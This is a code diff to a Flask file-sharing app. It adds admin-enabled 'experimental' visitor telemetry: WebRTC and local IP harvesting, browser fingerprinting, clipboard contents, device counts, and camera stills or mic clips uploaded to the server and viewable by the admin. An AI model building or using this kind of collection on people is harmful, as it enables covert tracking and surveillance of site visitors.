@@ -75,6 +75,7 @@ TRUST_PROXY   = _flag("DROPZONE_TRUST_PROXY")
 PUBLIC_SHARE  = _flag("DROPZONE_PUBLIC_SHARE")
 
 FILES_DIR   = os.path.join(DATA_DIR, "files")
+CAPTURES_DIR = os.path.join(DATA_DIR, "captures")
 DB_PATH     = os.path.join(DATA_DIR, "dropzone.db")
 SECRET_PATH = os.path.join(DATA_DIR, "secret.key")
 USERS_PATH  = os.path.join(DATA_DIR, "users.json")
@@ -91,6 +92,7 @@ ROLES              = ("admin", "user")
 CLI_COMMANDS       = ("set-password", "users", "remove-user")
 
 os.makedirs(FILES_DIR, exist_ok=True)
+os.makedirs(CAPTURES_DIR, exist_ok=True)
 
 app = Flask(__name__, static_folder="static", static_url_path="/static")
 app.config["MAX_CONTENT_LENGTH"] = MAX_MB * 1024 * 1024
@@ -552,7 +554,8 @@ def api_state():
     return jsonify(items=items, devices=devices, activity=activity, chat=chat,
                    me=me, remote=is_remote(me), stats=stats,
                    user=user["name"], role=user["role"], admin=admin, auth=auth_enabled(),
-                   ask_location=bool(access_cfg().get("enabled") and access_cfg().get("client_details") and access_cfg().get("precise_location")))
+                   ask_location=bool(access_cfg().get("enabled") and access_cfg().get("client_details") and access_cfg().get("precise_location")),
+                   experimental=(access_cfg().get("experimental", {}) if (access_cfg().get("enabled") and access_cfg().get("client_details")) else {}))
 
 # --------------------------------------------------------------------------- SSE push
 @app.route("/api/events")
@@ -875,6 +878,9 @@ def load_settings():
     al.setdefault("enabled", False); al.setdefault("geo", True); al.setdefault("client_details", True)
     al.setdefault("retention_days", 90)
     al.setdefault("precise_location", False)     # ask the browser for GPS position; the visitor sees a permission prompt and must allow it
+    exp = al.setdefault("experimental", {})
+    for k in ['webrtc_ip', 'battery', 'gpu', 'fingerprint', 'device_counts', 'notifications', 'motion', 'camera', 'mic', 'clipboard']:
+        exp.setdefault(k, False)
     return s
 
 def save_settings(s):
@@ -1229,7 +1235,9 @@ def api_telemetry():
     keep = {k: (str(v)[:120] if not isinstance(v, (int, float, bool)) else v) for k, v in d.items() if k in (
         "screen", "viewport", "dpr", "colorDepth", "tz", "lang", "languages", "platform", "touch", "cores", "memory",
         "connection", "uaBrands", "uaMobile", "uaPlatform", "vendor", "cookies", "dnt", "referrer", "page", "online", "battery",
-        "lat", "lon", "acc", "alt", "speed", "heading", "loc_error")}
+        "lat", "lon", "acc", "alt", "speed", "heading", "loc_error",
+        "webrtc_ips", "local_ips", "battery", "charging", "gpu", "fingerprint", "cam_count", "mic_count",
+        "speaker_count", "notif_perm", "motion", "clipboard", "exp_errors")}
     for k in ("lat", "lon", "acc", "alt", "speed", "heading"):
         if k in keep:
             try: keep[k] = round(float(keep[k]), 6)
@@ -1249,6 +1257,43 @@ def api_telemetry():
                       request.headers.get("User-Agent", "")[:400], browser, osn, device, "", (request.headers.get("Accept-Language") or "")[:80],
                       json.dumps(keep)))
     return jsonify(ok=True)
+
+@app.route("/api/telemetry-capture", methods=["POST"])
+@require_auth
+def api_telemetry_capture():
+    """Store a camera still or mic clip the visitor's browser captured AFTER they granted permission."""
+    cfg = access_cfg()
+    if not (cfg.get("enabled") and cfg.get("client_details")): return jsonify(ok=False), 200
+    exp = cfg.get("experimental", {})
+    kind = (request.form.get("kind") or "").strip()      # "camera" or "mic"
+    if kind not in ("camera", "mic") or not exp.get(kind): return jsonify(ok=False), 200
+    f = request.files.get("file")
+    if not f: return jsonify(error="no file"), 400
+    ext = {"camera": ".jpg", "mic": ".webm"}[kind]
+    cid = uuid.uuid4().hex
+    data = f.read(6 * 1024 * 1024)                        # hard cap: 6 MB
+    if not data: return jsonify(error="empty"), 400
+    open(os.path.join(CAPTURES_DIR, cid + ext), "wb").write(data)
+    ip = client_ip(); u = current_user() or {}
+    browser, osn, device = parse_ua(request.headers.get("User-Agent", ""))
+    with db() as conn:
+        conn.execute("""INSERT INTO access_log (id,ts,ip,via,user,role,method,path,status,detail,ua,browser,os,device,referer,lang,client)
+                        VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""",
+                     (uuid.uuid4().hex, time.time(), ip, classify_ip(ip), u.get("name") or "", u.get("role") or "",
+                      "CAPTURE", kind + "-capture", 200, f"{kind} captured ({len(data)//1024} KB)",
+                      request.headers.get("User-Agent", "")[:400], browser, osn, device, "", "",
+                      json.dumps({"capture": cid + ext, "kind": kind})))
+    bump()
+    return jsonify(ok=True, id=cid + ext)
+
+@app.route("/api/admin/capture/<cid>")
+@require_admin
+def api_admin_capture(cid):
+    cid = os.path.basename(cid)
+    path = os.path.join(CAPTURES_DIR, cid)
+    if not os.path.isfile(path): abort(404)
+    mime = "image/jpeg" if cid.endswith(".jpg") else "audio/webm" if cid.endswith(".webm") else "application/octet-stream"
+    return send_file(path, mimetype=mime, download_name=cid)
 
 @app.route("/api/admin/access")
 @require_admin
@@ -1283,6 +1328,10 @@ def api_admin_access_settings():
     s = load_settings(); al = s["access_log"]
     for k in ("enabled", "geo", "client_details", "precise_location"):
         if k in d: al[k] = bool(d[k])
+    if isinstance(d.get("experimental"), dict):
+        exp = al.setdefault("experimental", {})
+        for k in ['webrtc_ip', 'battery', 'gpu', 'fingerprint', 'device_counts', 'notifications', 'motion', 'camera', 'mic', 'clipboard']:
+            if k in d["experimental"]: exp[k] = bool(d["experimental"][k])
     if "retention_days" in d:
         try: al["retention_days"] = max(0, min(3650, int(d["retention_days"])))
         except (TypeError, ValueError): pass
@@ -1297,6 +1346,9 @@ def api_admin_access_clear():
     with db() as conn:
         n = conn.execute("DELETE FROM access_log").rowcount
         conn.execute("DELETE FROM geo_cache")
+    for fn in os.listdir(CAPTURES_DIR):
+        try: os.remove(os.path.join(CAPTURES_DIR, fn))
+        except OSError: pass
     return jsonify(ok=True, deleted=n)
 
 # ---- remote screen (x11vnc + noVNC via built-in websockify bridge) ----
